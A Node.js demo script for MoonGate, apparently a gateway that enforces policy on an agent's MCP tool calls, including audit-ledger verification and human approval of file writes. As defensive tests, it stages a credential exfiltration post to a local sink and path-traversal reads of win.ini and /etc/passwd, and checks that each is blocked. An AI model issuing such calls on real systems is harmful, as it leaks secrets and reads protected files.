#!/usr/bin/env node
// End-to-end demo against real processes.
//
// Layout: demo client -> MoonGate (gateway) -> demo MCP server -> real files and
// a real local HTTP sink. Every claim printed here is checked against an
// observable fact: the tool list the client received, the file on disk, the
// sink counter, or the ledger chain.
import { execFileSync, spawn } from 'node:child_process';
import { existsSync, mkdirSync, readFileSync, rmSync, writeFileSync } from 'node:fs';
import { dirname, join, resolve } from 'node:path';
import { fileURLToPath } from 'node:url';
import { McpPipe, approveOnce, waitForReady } from './client.mjs';

const ROOT = resolve(dirname(fileURLToPath(import.meta.url)), '..');
const WORKSPACE = join(ROOT, 'runs/workspace');
const LEDGER = join(ROOT, 'runs/demo.jsonl');
const POLICY = join(ROOT, 'examples/policy.workspace.json');
const REPORT = join(ROOT, 'runs/demo.report.html');
const SINK_PORT = 8787;
const SINK = `http://127.0.0.1:${SINK_PORT}`;

const step = (index, total, title) => console.log(`\n[${index}/${total}] ${title}`);
const ok = (message) => console.log(`  \u2713 ${message}`);
const bad = (message) => {
  console.log(`  \u2717 ${message}`);
  process.exitCode = 1;
};

function seedWorkspace() {
  rmSync(WORKSPACE, { recursive: true, force: true });
  mkdirSync(join(WORKSPACE, 'config'), { recursive: true });
  mkdirSync(join(WORKSPACE, 'notes'), { recursive: true });
  mkdirSync(join(WORKSPACE, 'reports'), { recursive: true });
  writeFileSync(
    join(WORKSPACE, 'config/.env'),
    'API_KEY=sk-live-DEMO-9f3a2b7c1d4e5f60\nDB_PASSWORD=postgres-prod-77c1\n',
  );
  writeFileSync(join(WORKSPACE, 'notes/todo.md'), '# 本周\n\n- 写周报\n- 清理临时目录\n');
}

async function startSink() {
  const child = spawn(process.execPath, [join(ROOT, 'demo/sink.mjs')], {
    stdio: ['ignore', 'ignore', 'pipe'],
    env: { ...process.env, MOONGATE_SINK_PORT: String(SINK_PORT) },
    windowsHide: true,
  });
  child.stderr.setEncoding('utf8');
  await new Promise((resolvePromise, reject) => {
    const timer = setTimeout(() => reject(new Error('sink did not start')), 5000);
    child.stderr.on('data', (chunk) => {
      if (chunk.includes('listening')) {
        clearTimeout(timer);
        resolvePromise();
      }
    });
  });
  return child;
}

async function sinkHits() {
  const response = await fetch(`${SINK}/count`);
  return (await response.json()).hits;
}

async function main() {
  seedWorkspace();
  const sink = await startSink();
  const pipe = new McpPipe(
    process.execPath,
    [join(ROOT, 'bin/moongate.mjs'), 'run', '--policy', POLICY, '--ledger', LEDGER, '--', process.execPath, join(ROOT, 'demo/server.mjs')],
    {
      cwd: ROOT,
      env: { MOONGATE_WORKSPACE: WORKSPACE, MOONGATE_SINK: SINK, MOONGATE_POLICY: POLICY },
      onNotice: (line) => {
        if (line.includes('approval required')) console.log(`  · ${line.replace('[moongate] ', '')}`);
      },
    },
  );

  const ready = await waitForReady(pipe);
  let hitsAtEnd = 0;
  console.log('MoonGate 演示 · 真实 MCP 进程、真实文件副作用');
  console.log(`  策略 ${ready.policy} · 指纹 ${ready.digest.slice(0, 12)}…`);
  console.log(`  审批台 ${ready.approval_url}`);
  console.log(`  账本 ${LEDGER}`);

  try {
    step(1, 9, '握手');
    const init = await pipe.initialize();
    ok(`initialize -> ${init.serverInfo.name} (${init.protocolVersion})`);

    step(2, 9, '工具清单被裁剪');
    const list = await pipe.request('tools/list', {});
    const names = list.tools.map((tool) => tool.name);
    ok(`agent 看到 ${names.length} 个工具：${names.join(', ')}`);
    if (names.includes('fs.delete')) bad('fs.delete 不应出现在工具清单里');
    else ok('fs.delete 已被隐藏（策略无条件拒绝，不需要 agent 去试错）');

    step(3, 9, '读取普通文件');
    const todo = await pipe.callTool('fs.read', { path: 'notes/todo.md' });
    ok(`读到 ${todo.content[0].text.split('\n').length} 行笔记`);

    step(4, 9, '读取凭据文件，数据被打上血缘标记');
    const env = await pipe.callTool('fs.read', { path: 'config/.env' });
    const secret = env.content[0].text.match(/API_KEY=(\S+)/)[1];
    ok(`读到凭据 ${secret.slice(0, 6)}…（该值只在进程内传递，账本只记录指纹）`);

    step(5, 9, '尝试把凭据外发');
    let blocked = null;
    try {
      await pipe.callTool('net.post', { url: `${SINK}/collect`, body: `key=${secret}` });
      bad('外发调用居然成功了');
    } catch (error) {
      blocked = error;
      ok(`被拒绝：${error.message}`);
      const rule = error.data?.moongate?.rule;
      if (rule === 'egress-taint') ok(`命中数据血缘规则，证据 ${error.data.moongate.evidence.length} 条`);
      else bad(`期望 egress-taint，实际 ${rule}`);
    }
    const hitsAfterBlock = await sinkHits();
    if (hitsAfterBlock === 0) ok('接收端计数仍为 0：上游服务从未收到这次请求');
    else bad(`接收端收到了 ${hitsAfterBlock} 次请求`);

    step(6, 9, '尝试路径逃逸');
    try {
      await pipe.callTool('fs.read', { path: '../../Windows/win.ini' });
      bad('路径逃逸居然成功了');
    } catch (error) {
      ok(`被拒绝：${error.message}`);
    }

    step(7, 9, '写报告需要人工批准');
    const writePromise = pipe.callTool('fs.write', { path: 'reports/summary.md', content: '# 周报\n\n本周完成网关。\n' });
    writePromise.catch(() => {});
    let approval = null;
    for (let i = 0; i < 40 && !approval; i += 1) {
      const state = await (await fetch(new URL('/state', ready.approval_url))).json();
      if (state.pending.length) approval = state.pending[0];
      else await new Promise((resolvePromise) => setTimeout(resolvePromise, 100));
    }
    if (!approval) {
      bad('没有收到审批请求');
    } else {
      ok(`审批请求：${approval.tool} · 摘要 ${JSON.stringify(approval.summary)}`);
      const decided = await approveOnce(ready.approval_url, { approve: true, matchTool: 'fs.write' });
      const result = await writePromise;
      ok(`批准一次 -> ${result.content[0].text}`);
      if (existsSync(join(WORKSPACE, 'reports/summary.md'))) ok('报告文件确实写入磁盘');
      else bad('批准后文件不存在');
      const state = await (await fetch(new URL('/state', ready.approval_url))).json();
      if (state.pending.length === 0) ok('批准已被消费，没有留下可复用的授权');
      console.log(`  · 本次授权的参数哈希 ${approval.digest.slice(0, 16)}…（${decided.call}）`);
    }

    step(8, 9, '换一份内容再写，必须重新审批');
    const second = pipe.callTool('fs.write', { path: 'reports/summary.md', content: '# 周报\n\n改过的内容。\n' });
    second.catch(() => {});
    let secondApproval = null;
    for (let i = 0; i < 40 && !secondApproval; i += 1) {
      const state = await (await fetch(new URL('/state', ready.approval_url))).json();
      if (state.pending.length) secondApproval = state.pending[0];
      else await new Promise((resolvePromise) => setTimeout(resolvePromise, 100));
    }
    if (!secondApproval) {
      bad('第二次写入没有触发审批');
    } else {
      ok(`参数哈希已变化：${secondApproval.digest.slice(0, 16)}…`);
      await approveOnce(ready.approval_url, { approve: false, matchTool: 'fs.write' });
      try {
        await second;
        bad('拒绝后调用居然完成');
      } catch (error) {
        ok(`人工拒绝：${error.message}`);
      }
      const content = readFileSync(join(WORKSPACE, 'reports/summary.md'), 'utf8');
      if (content.includes('改过的内容')) bad('被拒绝的写入仍然改变了文件');
      else ok('文件保持批准时的版本，被拒绝的写入没有落地');
    }

    try {
      await pipe.callTool('fs.delete', { path: 'notes/todo.md' });
      bad('删除调用居然成功了');
    } catch (error) {
      ok(`删除被拒绝：${error.message}`);
    }
    if (existsSync(join(WORKSPACE, 'notes/todo.md'))) ok('原文件仍在磁盘上');
    else bad('原文件被删除了');
    step(9, 9, '绕过网关，直连服务端');
    const direct = new McpPipe(process.execPath, [join(ROOT, 'demo/server.mjs')], {
      cwd: ROOT,
      env: { MOONGATE_WORKSPACE: WORKSPACE, MOONGATE_SINK: SINK, MOONGATE_POLICY: POLICY },
    });
    try {
      await direct.initialize();
      const removed = await direct.callTool('fs.delete', { path: 'notes/todo.md' });
      const removedText = String(removed.content?.[0]?.text ?? '');
      if (removed.isError && removedText.includes('guard')) ok(`服务端自己拒绝：${removedText}`);
      else bad('直连服务端时删除没有被拒绝');
      const escaped = await direct.callTool('fs.read', { path: 'reports/../../etc/passwd' });
      const escapedText = String(escaped.content?.[0]?.text ?? '');
      if (escaped.isError && escapedText.includes('guard')) ok(`路径穿越在服务端被拒绝：${escapedText}`);
      else bad('直连服务端时路径穿越没有被拒绝');
      if (existsSync(join(WORKSPACE, 'notes/todo.md'))) ok('第二次证明：不经过网关，文件仍在');
      else bad('文件被直连调用删除');
    } finally {
      await direct.close();
    }
    hitsAtEnd = await sinkHits();
  } finally {
    await pipe.close();
    sink.kill();
  }

  if (hitsAtEnd === 0) ok('整场运行接收端始终为 0 次请求');
  else bad(`整场运行接收端收到 ${hitsAtEnd} 次请求`);

  const verifyOut = execFileSync(process.execPath, [join(ROOT, 'bin/moongate.mjs'), 'verify', '--ledger', LEDGER], {
    encoding: 'utf8',
  });
  console.log(`\n${verifyOut.trim()}`);

  execFileSync(
    process.execPath,
    [join(ROOT, 'bin/moongate.mjs'), 'report', '--ledger', LEDGER, '--out', REPORT, '--policy', POLICY],
    { encoding: 'utf8', stdio: 'inherit' },
  );
  console.log(`\n演示完成。报告：${REPORT}`);
  console.log(`账本可用以下命令复核：node bin/moongate.mjs verify --ledger ${LEDGER}`);
}

main().catch((error) => {
  console.error(`\n演示失败：${error.stack || error.message}`);
  process.exitCode = 1;
});
